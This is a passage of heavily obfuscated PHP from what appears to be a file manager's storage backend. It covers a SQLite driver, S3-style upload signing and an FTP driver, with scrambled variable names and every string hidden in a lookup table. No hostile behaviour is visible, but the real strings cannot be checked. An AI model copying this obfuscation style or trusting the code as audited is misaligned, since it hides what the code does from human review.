(empty($éæëğÚ¿)) { $éæëğÚ¿ = $this->config; } $this->linkID[$Ë¾«ÛÂÚ] = new SQLite3($éæëğÚ¿[$Æİ±Ñ[21]]); if (!$this->linkID[$Ë¾«ÛÂÚ]) { think_exception($this->linkID[$Ë¾«ÛÂÚ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$Ë¾«ÛÂÚ]->busyTimeout(30000); if (1 != think_config($Æİ±Ñ[22])) { unset($this->config); } } return $this->linkID[$Ë¾«ÛÂÚ]; } public function free() { $this->queryID = null; } public function query($É¸ÊïÕå) { $Æ£ƒ·ÀÈ =& $_SERVER[ĞÆÏ¡Îª]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $É¸ÊïÕå; if ($this->queryID) { $this->free(); } think_action_status($Æ£ƒ·ÀÈ[23], 1); think_status($Æ£ƒ·ÀÈ[24]); $this->queryID = $this->_linkID->query($É¸ÊïÕå); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $„ÁÊâİá = $this->getAll(); $this->numRows = count($„ÁÊâİá); return $„ÁÊâİá; } } public function execute($À§İ‘«) { $¾éàİÜ =& $_SERVER[ĞÆÏ¡Îª]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $À§İ‘«; if ($this->queryID) { $this->free(); } think_action_status($¾éàİÜ[25], 1); think_status($¾éàİÜ[24]); $ôØØòĞ = $this->_linkID->exec($À§İ‘«); $this->debug(); if (!1 === $ôØØòĞ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ĞÆÏ¡Îª][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ŸœŠÖ£â = $this->_linkID->query($_SERVER[ĞÆÏ¡Îª][27]); if (!$ŸœŠÖ£â) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $™ÌñÂó¿ = $this->_linkID->query($_SERVER[ĞÆÏ¡Îª][28]); if (!$™ÌñÂó¿) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $É¿ğ›±Ñ = array(); while ($„ÒŒøÒÏ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $É¿ğ›±Ñ[] = $„ÒŒøÒÏ; } $this->queryID->reset(); return $É¿ğ›±Ñ; } public function getFields($å‘ÜƒğÙ) { $½ÉÍåÊº =& $_SERVER[ĞÆÏ¡Îª]; $Ì™¿«½­ = $this->query($½ÉÍåÊº[29] . $å‘ÜƒğÙ . $½ÉÍåÊº[30]); $üû³ü®Ã = array(); if ($Ì™¿«½­) { foreach ($Ì™¿«½­ as $ñ¥æçŒ => $ ¾ÈØÇ) { $üû³ü®Ã[$ ¾ÈØÇ[$½ÉÍåÊº[32]]] = array($½ÉÍåÊº[32] => $ ¾ÈØÇ[$½ÉÍåÊº[32]], $½ÉÍåÊº[33] => $ ¾ÈØÇ[$½ÉÍåÊº[33]], $½ÉÍåÊº[35] => (bool) ($ ¾ÈØÇ[$½ÉÍåÊº[35]] === $½ÉÍåÊº[12]), $½ÉÍåÊº[37] => $ ¾ÈØÇ[$½ÉÍåÊº[56]], $½ÉÍåÊº[39] => (bool) $ ¾ÈØÇ[$½ÉÍåÊº[57]], $½ÉÍåÊº[42] => (bool) $ ¾ÈØÇ[$½ÉÍåÊº[57]]); } } return $üû³ü®Ã; } public function getTables($¬ìÚÔƒÜ = '') { $®â ä‚¸ =& $_SERVER[ĞÆÏ¡Îª]; $…ô¸ìÛÕ = $this->query($®â ä‚¸[45] . $®â ä‚¸[46] . $®â ä‚¸[47]); $¼úÄ«Æì = array(); foreach ($…ô¸ìÛÕ as $óÈˆßœ± => $¨µëï÷™) { $¼úÄ«Æì[$óÈˆßœ±] = current($¨µëï÷™); } return $¼úÄ«Æì; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $¸ŠßŠ¯… =& $_SERVER[ĞÆÏ¡Îª]; $this->error = $this->_linkID->lastErrorMsg(); if ($¸ŠßŠ¯…[12] != $this->queryStr) { $this->error .= LNG($¸ŠßŠ¯…[48]) . $this->queryStr; } think_trace($this->error, $¸ŠßŠ¯…[12], $¸ŠßŠ¯…[49]); return $this->error; } public function escapeString($¼áÏ€İ‹) { $Õ½¡ƒ£– =& $_SERVER[ĞÆÏ¡Îª]; if ($this->_linkID) { return $this->_linkID->escapeString($¼áÏ€İ‹); } return str_ireplace($Õ½¡ƒ£–[58], $Õ½¡ƒ£–[59], $¼áÏ€İ‹); } public function parseLimit($òñèÚë¢) { $½Ø¼Öß¬ =& $_SERVER[ĞÆÏ¡Îª]; $§¦Ê…‹ß = $½Ø¼Öß¬[12]; if (!empty($òñèÚë¢)) { $òñèÚë¢ = explode($½Ø¼Öß¬[50], $òñèÚë¢); if (count($òñèÚë¢) > 1) { $§¦Ê…‹ß .= $½Ø¼Öß¬[51] . $òñèÚë¢[1] . $½Ø¼Öß¬[52] . $òñèÚë¢[0] . $½Ø¼Öß¬[53]; } else { $§¦Ê…‹ß .= $½Ø¼Öß¬[51] . $òñèÚë¢[0] . $½Ø¼Öß¬[53]; } } return $§¦Ê…‹ß; } } goto aË„ëàœ¦¼; e®µË¢®ô”: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($‘î ó÷´) { parent::__construct($‘î ó÷´); $this->signatureVersion($_SERVER[ĞÆÏ¡Îª][216]); } public function uploadFormData($¶•¢ËÍ†, $èîÑÅ²è = 3600) { $¹Äğ…ˆ‘ =& $_SERVER[ĞÆÏ¡Îª]; $±ÏçÕÒ = $¹Äğ…ˆ‘[198]; $Çœ•ğ·è = $¹Äğ…ˆ‘[1337]; $ÁË÷„ãÓ = $¹Äğ…ˆ‘[62]; $öİäöÁ† = gmdate($¹Äğ…ˆ‘[1338]); $‰€ñÏÖÎ = gmdate($¹Äğ…ˆ‘[746]); $ó»ÍƒµÃ = $¹Äğ…ˆ‘[1339]; $æùüŠë = $èîÑÅ²è . $¹Äğ…ˆ‘[12]; $—‰›¥…´ = $¹Äğ…ˆ‘[1301]; $Úş¿•¬Š = array($this->accessKey, $‰€ñÏÖÎ, $this->region, $ÁË÷„ãÓ, $ó»ÍƒµÃ); $›±ìËÆî = implode($¹Äğ…ˆ‘[8], $Úş¿•¬Š); $‰ŒÔ‰Åû = array($¹Äğ…ˆ‘[1303] => gmdate($¹Äğ…ˆ‘[1302], strtotime($¹Äğ…ˆ‘[1340])), $¹Äğ…ˆ‘[1304] => array(array($¹Äğ…ˆ‘[1306] => $this->bucket), array($¹Äğ…ˆ‘[1305] => $±ÏçÕÒ), array($¹Äğ…ˆ‘[1307], $¹Äğ…ˆ‘[1308], $¹Äğ…ˆ‘[12]), array($¹Äğ…ˆ‘[1307], $¹Äğ…ˆ‘[1341], $¹Äğ…ˆ‘[12]), array($¹Äğ…ˆ‘[1307], $¹Äğ…ˆ‘[1342], $¹Äğ…ˆ‘[12]), array($¹Äğ…ˆ‘[1309] => $—‰›¥…´), array($¹Äğ…ˆ‘[1343] => $›±ìËÆî), array($¹Äğ…ˆ‘[1344] => $Çœ•ğ·è), array($¹Äğ…ˆ‘[1345] => $öİäöÁ†), array($¹Äğ…ˆ‘[1346] => $æùüŠë))); $ºÎá¬¬ú = base64_encode(json_encode($‰ŒÔ‰Åû)); $½¯Ì¸– = hash_hmac($¹Äğ…ˆ‘[1347], $‰€ñÏÖÎ, $¹Äğ…ˆ‘[1348] . $this->secret, !0); $Š½ôÒûï = hash_hmac($¹Äğ…ˆ‘[1347], $this->region, $½¯Ì¸–, !0); $ï§ë…ª¾ = hash_hmac($¹Äğ…ˆ‘[1347], $ÁË÷„ãÓ, $Š½ôÒûï, !0); $•Şï½ß• = hash_hmac($¹Äğ…ˆ‘[1347], $ó»ÍƒµÃ, $ï§ë…ª¾, !0); $Ñç¯ìì¢ = hash_hmac($¹Äğ…ˆ‘[1347], $ºÎá¬¬ú, $•Şï½ß•); $†À‰èÀÔ = array($¹Äğ…ˆ‘[215] => $¹Äğ…ˆ‘[12], $¹Äğ…ˆ‘[1349] => $¹Äğ…ˆ‘[12], $¹Äğ…ˆ‘[1305] => $±ÏçÕÒ, $¹Äğ…ˆ‘[1309] => $—‰›¥…´, $¹Äğ…ˆ‘[1313] => $ºÎá¬¬ú, $¹Äğ…ˆ‘[1350] => $›±ìËÆî, $¹Äğ…ˆ‘[1351] => $Çœ•ğ·è, $¹Äğ…ˆ‘[1352] => $öİäöÁ†, $¹Äğ…ˆ‘[1353] => $æùüŠë, $¹Äğ…ˆ‘[1354] => $Ñç¯ìì¢, $¹Äğ…ˆ‘[181] => $this->getHost()); return $†À‰èÀÔ; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($ñÍöéÕ) { parent::__construct(); if (count($ñÍöéÕ) > 0) { $this->_init($ñÍöéÕ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ûáÇ„ëÙ) { $‹ •‚¡š =& $_SERVER[ĞÆÏ¡Îª]; global $config; $this->appCharset = $config[$‹ •‚¡š[1355]]; $this->systemCharset = $config[$‹ •‚¡š[1356]]; if (isset($ûáÇ„ëÙ[$‹ •‚¡š[1357]]) && $ûáÇ„ëÙ[$‹ •‚¡š[1357]]) { $this->systemCharset = $ûáÇ„ëÙ[$‹ •‚¡š[1357]]; } } public function iconvApp($Ëàø×‡Ù) { return $this->iconvTo($Ëàø×‡Ù, $this->systemCharset, $this->appCharset); } public function iconvSystem($—›‰›Š‡) { return $this->iconvTo($—›‰›Š‡, $this->appCharset, $this->systemCharset); } public function getPathOuter($Õ¯Ë¿ª±) { $–±…ıò´ =& $_SERVER[ĞÆÏ¡Îª]; $Ş™¹Ö·¦ = $this->iconvApp($this->pathBase); $Õ¯Ë¿ª± = $this->iconvApp($Õ¯Ë¿ª±); if (substr($Ş™¹Ö·¦, 0, 2) == $–±…ıò´[1358]) { $Ş™¹Ö·¦ = BASIC_PATH . substr($Ş™¹Ö·¦, 2); } if (substr($Õ¯Ë¿ª±, 0, 2) == $–±…ıò´[1358]) { $Õ¯Ë¿ª± = BASIC_PATH . substr($Õ¯Ë¿ª±, 2); } $Ş™¹Ö·¦ = KodIO::clear($Ş™¹Ö·¦); $Õ¯Ë¿ª± = KodIO::clear($Õ¯Ë¿ª±); $Õ¯Ë¿ª± = substr($Õ¯Ë¿ª±, strlen($Ş™¹Ö·¦)); if (empty($this->pathDriver)) { return $Õ¯Ë¿ª±; } return $this->pathDriver . $–±…ıò´[8] . ltrim($Õ¯Ë¿ª±, $–±…ıò´[8]); } private function _init($Ğëßº¡ = array()) { $ùÓÇè×³ =& $_SERVER[ĞÆÏ¡Îª]; if (!function_exists($ùÓÇè×³[1359])) { throw new Exception(LNG($ùÓÇè×³[1360])); } $this->config = $Ğëßº¡; $this->charsetReset($Ğëßº¡); foreach ($Ğëßº¡ as $Ÿæë‡ˆ => $Ãı‰’±¹) { if (isset($this->{$Ÿæë‡ˆ})) { $this->{$Ÿæë‡ˆ} = $Ãı‰’±¹; } } return $this->_login($Ğëßº¡); } private function _login($›Àñ•í¶) { $™ˆÌÙˆâ =& $_SERVER[ĞÆÏ¡Îª]; static $ñ¡Âæ°‡ = array(); $«Ú…±÷‹ = md5(json_encode($›Àñ•í¶)); if (isset($ñ¡Âæ°‡[$«Ú…±÷‹])) { foreach ($ñ¡Âæ°‡[$«Ú…±÷‹] as $ŸˆÛ÷ˆ¹ => $Ì¹å³Ê) { $this->{$ŸˆÛ÷ˆ¹} = $Ì¹å³Ê; } return !0; } $á±°á©† = parse_url(trim($this->server, $™ˆÌÙˆâ[8])); $this->host = $á±°á©†[$™ˆÌÙˆâ[181]]; $©ö×Î»÷ = isset($á±°á©†[$™ˆÌÙˆâ[180]]) && $á±°á©†[$™ˆÌÙˆâ[180]] == $™ˆÌÙˆâ[1361] ? !0 : !1; $this->scheme = $©ö×Î»÷ ? $™ˆÌÙˆâ[1362] : $™ˆÌÙˆâ[1363]; $this->port = isset($á±°á©†[$™ˆÌÙˆâ[182]]) ? $á±°á©†[$™ˆÌÙˆâ[182]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $ùù³‡˜¤ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $É©®®¸® = $this->pasv == $™ˆÌÙˆâ[88] ? !0 : !1; @ftp_pasv($this->connect, $É©®®¸®); $ñ¡Âæ°‡[$«Ú…±÷‹] = array($™ˆÌÙˆâ[1364] => $this->connect, $™ˆÌÙˆâ[181] => $this->host, $™ˆÌÙˆâ[180] => $this->scheme, $™ˆÌÙˆâ[182] => $this->port); return $ùù³‡˜¤; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($±é¨äÓ«, $Ğš£óÂ = '', $œˆ²‘·Ú = REPEAT_RENAME) { if ($this->setContent($±é¨äÓ«, $Ğš£óÂ)) { return $this->getPathOuter($±é¨äÓ«); } return !1; } public function mkdir($ÓÇä£ºá, $Ì£ç“£  = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $ÓÇä£ºá = $this->iconvSystem($ÓÇä£ºá); if ($this->_isFolder($ÓÇä£ºá) || @ftp_mkdir($this->connect, $ÓÇä£ºá)) { return $this->getPathOuter($ÓÇä£ºá); } if (!$this->mkdir($this->pathFather($ÓÇä£ºá))) { return !1; } if ($ÓÇä£ºá = @ftp_mkdir($this->connect, $ÓÇä£ºá)) { return $this->getPathOuter($ÓÇä£ºá); } return !1; } public function copyFile($úïàÂ®, $¥®¤Í) { if (!$this->_isconn()) { return !1; } $®€àŸº‹ = $this->pathThis($this->iconvSystem($úïàÂ®)); $òŞÌşšÁ = $this->tempFile($®€àŸº‹); $ƒÌ÷µ´î = $this->iconvApp($òŞÌşšÁ); $this->download($úïàÂ®, $ƒÌ÷µ´î); $å’¼âöÒ = $this->upload($¥®¤Í, $ƒÌ÷µ´î); $this->tempFileRemve($òŞÌşšÁ); return $å’¼âöÒ; } public function moveFile($ßÖ“‘„¡, $ô±Èî«¬) { if (!$this->_isconn()) { return !1; } $ßÖ“‘„¡ = $this->iconvSystem($ßÖ“‘„¡); $ô±Èî«¬ = $this->iconvSystem($ô±Èî«¬); $Ä¾æàõ = @ftp_rename($this->connect, $ßÖ“‘„¡, $ô±Èî«¬); return $Ä¾æàõ ? $this->getPathOuter($ô±Èî«¬) : !1; } public function delFile($€ÏÜèëë) { if (!$this->_isconn()) { return !1; } $€ÏÜèëë = $this->iconvSystem($€ÏÜèëë); return @ftp_delete($this->connect, $€ÏÜèëë); } public function delFolder($«İÀğÑ•) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $‰ˆÀë­‚ = $±Éü–ñ› = array(); $this->fileList($«İÀğÑ•, $‰ˆÀë­‚, $±Éü–ñ›, !0); $this->listItemCache = !0; foreach ($±Éü–ñ› as $Ë­Ö¬Õ®) { $ÉµÓÔÃ² = $this->iconvSystem($Ë­Ö¬Õ®[$_SERVER[ĞÆÏ¡Îª][32]]); $ô”µÊ‚Ô = @ftp_delete($this->connect, $ÉµÓÔÃ²); if (!$ô”µÊ‚Ô) { return !1; } } foreach ($‰ˆÀë­‚ as $ÉµÓÔÃ²) { $ÉµÓÔÃ² = $this->iconvSystem($ÉµÓÔÃ²); $ô”µÊ‚Ô = @ftp_rmdir($this->connect, $ÉµÓÔÃ²); if (!$ô”µÊ‚Ô) { return !1; } } $«İÀğÑ• = $this->iconvSystem($«İÀğÑ•); return @ftp_rmdir($this->connect, $«İÀğÑ•); } public function rename($ãİ¬í¶Ğ, $ºˆù¹Ô) { $ú§ÜÄ“‹ =& $_SERVER[ĞÆÏ¡Îª]; if (!$this->_isconn()) { return !1; } $É°Œæ¹Ó = $this->fileNameAuto($this->pathFather($ãİ¬í¶Ğ), $ºˆù¹Ô); $É°Œæ¹Ó = $this->iconvSystem($É°Œæ¹Ó); $ãİ¬í¶Ğ = $this->iconvSystem($ãİ¬í¶Ğ); $¨ö²Æ¸Ä = $this->pathFather($ãİ¬í¶Ğ); $ÄÆ«ßúÕ = rtrim($¨ö²Æ¸Ä, $ú§ÜÄ“‹[8]) . $ú§ÜÄ“‹[8] . $É°Œæ¹Ó; $ö€ëÔ» = @ftp_rename($this->connect, $ãİ¬í¶Ğ, $ÄÆ«ßúÕ); $ÄÆ«ßúÕ = $this->iconvApp($ÄÆ«ßúÕ); return $ö€ëÔ» ? $this->getPathOuter($ÄÆ«ßúÕ) : !1; } private function folderInfo($„óöîÉê, $ï¡Î·ˆ” = false) { $”òÉ‚Â¥ =& $_SERVER[ĞÆÏ¡Îª]; $ßÌ…Â™ = array($”òÉ‚Â¥[32] => $this->pathThis($„óöîÉê), $”òÉ‚Â¥[84] => $this->getPathOuter($”òÉ‚Â¥[8] . $„óöîÉê), $”òÉ‚Â¥[33] => $”òÉ‚Â¥[75]); if ($ï¡Î·ˆ”) { return $ßÌ…Â™; } $ßÌ…Â™[$”òÉ‚Â¥[200]] = $ßÌ…Â™[$”òÉ‚Â¥[85]] = 0; $ßÌ…Â™[$”òÉ‚Â¥[201]] = $ßÌ…Â™[$”òÉ‚Â¥[202]] = !0; return $ßÌ…Â™; } private function fileInfo($µ´äâÌâ, $‹öííÀÂ = false, $à×Üì‘ = array()) { $Õ–Å¥­½ =& $_SERVER[ĞÆÏ¡Îª]; $ÉößÕàÆ = array($Õ–Å¥­½[32] => $this->pathThis($µ´äâÌâ), $Õ–Å¥­½[84] => $this->getPathOuter($Õ–Å¥­½[8] . $µ´äâÌâ), $Õ–Å¥­½[33] => $Õ–Å¥­½[199], $Õ–Å¥­½[76] => isset($à×Üì‘[$Õ–Å¥­½[76]]) ? $à×Üì‘[$Õ–Å¥­½[76]] : 0, $Õ–Å¥­½[174] => $this->ext($µ´äâÌâ)); if ($‹öííÀÂ) { return $ÉößÕàÆ; } $ÉößÕàÆ[$Õ–Å¥­½[200]] = $ÉößÕàÆ[$Õ–Å¥­½[85]] = 0; $ÉößÕàÆ[$Õ–Å¥­½[201]] = $ÉößÕàÆ[$Õ–Å¥­½[202]] = !0; $äê½Şû¦ = $this->iconvSystem($µ´äâÌâ); $ÉößÕàÆ[$Õ–Å¥­½[85]] = @ftp_mdtm($this->connect, $äê½Şû¦); if (empty($à×Üì‘)) { $à×Üì‘ = $this->objectMeta($µ´äâÌâ); if (!$à×Üì‘) { return $ÉößÕàÆ; } } $ÉößÕàÆ[$Õ–Å¥­½[76]] = $à×Üì‘[$Õ–Å¥­½[76]]; return $ÉößÕàÆ; } public function size($°İó¼º‹) { $°úéÉå‰ = $this->objectMeta($°İó¼º‹); return $°úéÉå‰ ? $°úéÉå‰[$_SERVER[ĞÆÏ¡Îª][76]] : 0; } public function info($Å—çøÌÀ) { if ($this->isFile($Å—çøÌÀ)) { return $this->fileInfo($Å—çøÌÀ, 0); } else { if ($this->isFolder($Å—çøÌÀ)) { return $this->folderInfo($Å—çøÌÀ); } } return !1; } private function fileList($Ï’­¶Ëë, &$ë‹Æëİ», &$ÚÇœÄáà, $»‡ÇĞØˆ = false) { $™ùãşùó =& $_SERVER[ĞÆÏ¡Îª]; $Ï’­¶Ëë = $this->iconvSystem($Ï’­¶Ëë); if (!$this->isFolder($Ï’­¶Ëë)) { return !1; } @ftp_chdir($this->connect, $™ùãşùó[8]); $Ï’­¶Ëë = rtrim($Ï’­¶Ëë, $™ùãşùó[8]) . $™ùãşùó[8]; check_abort(); $œ¥úÕ‰æ = @ftp_rawlist($this->connect, $Ï’­¶Ëë); if (!$œ¥úÕ‰æ) { $œ¥úÕ‰æ = array(); } $óÈÅÛÄ• = array($™ùãşùó[10] => 1, $™ùãşùó[1365] => 1); foreach ($œ¥úÕ‰æ as $‹§Ùœ) { $°†¿È€Ï = $this->_listItem($‹§Ùœ); if ($°†¿È€Ï[0] == $™ùãşùó[754]) { continue; } $€¬ùÚÓÅ = $°†¿È€Ï[8]; if (empty($€¬ùÚÓÅ) && $€¬ùÚÓÅ !== $™ùãşùó[197] || isset($óÈÅÛÄ•[$€¬ùÚÓÅ])) { continue; } $€¬ùÚÓÅ = $this->iconvApp($Ï’­¶Ëë . ltrim($€¬ùÚÓÅ, $™ùãşùó[8])); $åæˆ±û‚ = array($™ùãşùó[32] => $€¬ùÚÓÅ, $™ùãşùó[33] => $™ùãşùó[199], $™ùãşùó[76] => $°†¿È€Ï[4]); if (substr($‹§Ùœ, 0, 1) == $™ùãşùó[1366]) { $åæˆ±û‚[$™ùãşùó[33]] = $™ùãşùó[75]; $åæˆ±û‚[$™ùãşùó[76]] = 0; } $¢îÃ™² = $åæˆ±û‚[$™ùãşùó[33]] == $™ùãşùó[75] ? !0 : !1; $this->cacheMethodInfoSet($€¬ùÚÓÅ, $¢îÃ™², $åæˆ±û‚); if ($¢îÃ™²) { $ë‹Æëİ»[] = $€¬ùÚÓÅ; if ($»‡ÇĞØˆ) { $this->fileList($€¬ùÚÓÅ, $ë‹Æëİ», $ÚÇœÄáà, $»‡ÇĞØˆ); } continue; } $ÚÇœÄáà[] = $åæˆ±û‚; } $this->cacheMethodInfoSet($Ï’­¶Ëë, !0); } private function _listItem($éÌµÙ) { if (empty($éÌµÙ)) { return array(); } $šÔÄ±üù = preg_split($_SERVER[ĞÆÏ¡Îª][1367], $éÌµÙ); if (count($šÔÄ±üù) <= 9) { return $šÔÄ±üù; } $šÔÄ±üù[8] = trim(substr($éÌµÙ, strpos($éÌµÙ, $šÔÄ±üù[7]) + strlen($šÔÄ±üù[7]))); return array_splice($šÔÄ±üù, 0, 9); } public function listPath($–´ ÁÓ¦, $ò¹ôğ±ƒ = false) { $›½ÙºËÖ =& $_SERVER[ĞÆÏ¡Îª]; if (!$this->_isconn()) { return !1; } $àÀˆ­· = $’“¨©‡« = array(); $this->fileList($–´ ÁÓ¦, $àÀˆ­·, $’“¨©‡«); foreach ($àÀˆ­· as $Õëù¸…» => $É­¶ê×ç) { $àÀˆ­·[$Õëù¸…»] = $this->folderInfo($É­¶ê×ç, $ò¹ôğ±ƒ); } foreach ($’“¨©‡« as $Õëù¸…» => $É­¶ê×ç) { $’“¨©‡«[$Õëù¸…»] = $this->fileInfo($É­¶ê×ç[$›½ÙºËÖ[32]], $ò¹ôğ±ƒ, $É­¶ê×ç); } return array($›½ÙºËÖ[82] => $àÀˆ­·, $›½ÙºËÖ[83] => $’“¨©‡«); } public function has($¸Ì¢¿ª…, $ÑúÌ™à = false, $´Ï«ìÒ = true) { $Ş¬¦³î‰ =& $_SERVER[ĞÆÏ¡Îª]; $ß—şëÜ¤ = $ĞœáÁÆê = array(); $Û½€ëÃ = $ÑúÌ™à ? !0 : !1; $this->fileList($¸Ì¢¿ª…, $ß—şëÜ¤, $ĞœáÁÆê, $Û½€ëÃ); if ($ÑúÌ™à) { return array($Ş¬¦³î‰[207] => count($ĞœáÁÆê), $Ş¬¦³î‰[208] => count($ß—şëÜ¤)); } if ($´Ï«ìÒ) { if (count($ĞœáÁÆê)) { return !0; } } else { if (count($ß—şëÜ¤)) { return !0; } } return !1; } public function listAll($™‰šæıì) { $¾Á×Šæ =& $_SERVER[ĞÆÏ¡Îª]; if (!$this->_isconn()) { return !1; } $ßä¡û’‹ = $¾õ‹¾âÀ = array(); $this->fileList($™‰šæıì, $ßä¡û’‹, $¾õ‹¾âÀ, !0); $ö«Ô¤¹è = array(); foreach ($¾õ‹¾âÀ as $¤óäÚ†) { $ö«Ô¤¹è[$¤óäÚ†[$¾Á×Šæ[32]]] = $¤óäÚ†[$¾Á×Šæ[76]]; } foreach ($ßä¡û’‹ as $¤óäÚ†) { if (is_string($¤óäÚ†)) { $ö«Ô¤¹è[$¤óäÚ†] = 0; } } return $this->listAllFiles($™‰šæıì, array_keys($ö«Ô¤¹è), $ö«Ô¤¹è); } public function getContent($¶ææõâ) { if (!$this->_isconn()) { return !1; } $¶ææõâ = $this->iconvSystem($¶ææõâ); return $this->fileSubstr($¶ææõâ); } public function setContent($Ïœ¹ƒ÷, $Ì×¸†¢ä = '') { if (!$this->_isconn()) { return !1; } $¸”Öã£î = $this->pathThis($this->iconvSystem($Ïœ¹ƒ÷)); $“«„Üù = $this->tempFile($¸”Öã£î); file_put_contents($“«„Üù, $Ì×¸†¢ä); $ûÃşäïÑ = $this->upload($Ïœ¹ƒ÷, $this->iconvApp($“«„Üù)); $this->tempFileRemve($“«„Üù); return $ûÃşäïÑ; } public function fileSubstr($¢åååÏí, $½Ù™Ôâ˜ = 0, $ßäŒÀùŸ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($¢åååÏí, $½Ù™Ôâ˜, $ßäŒÀùŸ); } private function ftpRequest($€™öà¨Ø, $éÛò­û = 0, $Ùµ›à­ˆ = false) { $€™öà¨Ø = $this->iconvSystem($€™öà¨Ø); $‚„Ûœ¨¸ = $this->scheme . $this->host . $_SERVER[ĞÆÏ¡Îª][4] . $this->port; $®…‹“û = curl_init(); curl_setopt($®…‹“û, CURLOPT_URL, $‚„Ûœ¨¸ . $this->pathEncode($€™öà¨Ø)); curl_setopt($®…‹“û, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($Ùµ›à­ˆ) { $÷¬’¹³› = $éÛò­û + $Ùµ›à­ˆ - 1; curl_setopt($®…‹“û, CURLOPT_RANGE, "{$éÛò­û}\x2d{$÷¬’¹³›}"); } curl_setopt($®…‹“û, CURLOPT_RETURNTRANSFER, 1); $’¢àğ¼• = curl_exec($®…‹“û); curl_close($®…‹“û); return $’¢àğ¼•; } public function upload($ßü¦”í”, $ôŸ€ò Æ, $îî°Î“Ù = false, $ÒÅ›ıÒ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($ßü¦”í”))) { return !1; } $ßü¦”í” = $this->iconvSystem($ßü¦”í”); $ôŸ€ò Æ = $this->iconvSystem($ôŸ€ò Æ); $¢²¼Üû“ = ftp_nb_put($this->connect, $ßü¦”í”, $ôŸ€ò Æ, FTP_BINARY); while ($¢²¼Üû“ == FTP_MOREDATA) { $¢²¼Üû“ = ftp_nb_continue($this->connect); } if ($¢²¼Üû“ != FTP_FINISHED) { return !1; } return $this->getPathOuter($ßü¦”í”); } public function download($š´Òßßâ, $ªØÇƒş = '') { if (!$this->_isconn()) { return !1; } $“È© ÇŸ = $this->pathFather($ªØÇƒş); if (!IO::mkdir($“È© ÇŸ)) { return !1; } $š´Òßßâ = $this->iconvSystem($š´Òßßâ); $ªØÇƒş = $this->iconvSystem($ªØÇƒş); $Ñçƒ½ñ² = ftp_nb_get($this->connect, $ªØÇƒş, $š´Òßßâ, FTP_BINARY); while ($Ñçƒ½ñ² == FTP_MOREDATA) { $Ñçƒ½ñ² = ftp_nb_continue($this->connect); } if ($Ñçƒ½ñ² != FTP_FINISHED) { return !1; } return $this->iconvApp($ªØÇƒş); } public function exist($›ÔÛ‘Íä) { return $this->isFile($›ÔÛ‘Íä) || $this->isFolder($›ÔÛ‘Íä); } public function isFile($“ßÚ¸ª›) { return !$this->isFolder($“ßÚ¸ª›) && $this->objectMeta($“ßÚ¸ª›); } public function isFolder($äû¬é†©) { return $this->cacheMethod($_SERVER[ĞÆÏ¡Îª][165], $äû¬é†©); } protected function objectMeta($á“¼ß«Ó) { return $this->cacheMethod($_SERVER[ĞÆÏ¡Îª][167], $á“¼ß«Ó); } protected function _objectMeta($†•°õöâ) { $²âáú´á =& $_SERVER[ĞÆÏ¡Îª]; if ($†•°õöâ == $²âáú´á[12] || $†•°õöâ == $²âáú´á[8]) { return array(); } if (!$this->_isconn()) { return !1; } $†•°õöâ = $this->iconvSystem($†•°õöâ); $‚®‡¼‘– = array($²âáú´á[32] => $this->iconvApp($†•°õöâ), $²âáú´á[33] => $²âáú´á[199], $²âáú´á[76] => 0); @ftp_chdir($this->connect, $²âáú´á[8]); $¸’”ÊÀ = @ftp_size($this->connect, $†•°õöâ); if ($¸’”ÊÀ != -1) { $‚®‡¼‘–[$²âáú´á[76]] = $¸’”ÊÀ; } else { $ûŞ§«™¶ = @ftp_chdir($this->connect, $†•°õöâ); if (!$ûŞ§«™¶) { return !1; } $‚®‡¼‘–[$²âáú´á[33]] = $²âáú´á[75]; } return $‚®‡¼‘–; } protected function _isFolder($”Ñïªöı) { $Í¥Å½ =& $_SERVER[ĞÆÏ¡Îª]; if ($”Ñïªöı == $Í¥Å½[12] || $”Ñïªöı == $Í¥Å½[8]) { return !0; } $çëÕê‡Ù = $this->_objectMeta($”Ñïªöı); return isset($çëÕê‡Ù[$Í¥Å½[33]]) && $çëÕê‡Ù[$Í¥Å½[33]] == $Í¥Å½[75] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($şÁ‰„·) { if (substr($şÁ‰„·, 0, 2) == $_SERVER[ĞÆÏ¡Îª][1358]) { $şÁ‰„· = BASIC_PATH . substr($şÁ‰„·, 2); } return $şÁ‰„·; } public function iconvApp($¶Å¼¥ğŸ) { $ÌĞòİŠ =& $_SERVER[ĞÆÏ¡Îª]; global $config; return $this->iconvTo($¶Å¼¥ğŸ, $config[$ÌĞòİŠ[1356]], $config[$ÌĞòİŠ[1355]]); } public function iconvSystem($°áóëá) { $¿ì¹¦æ =& 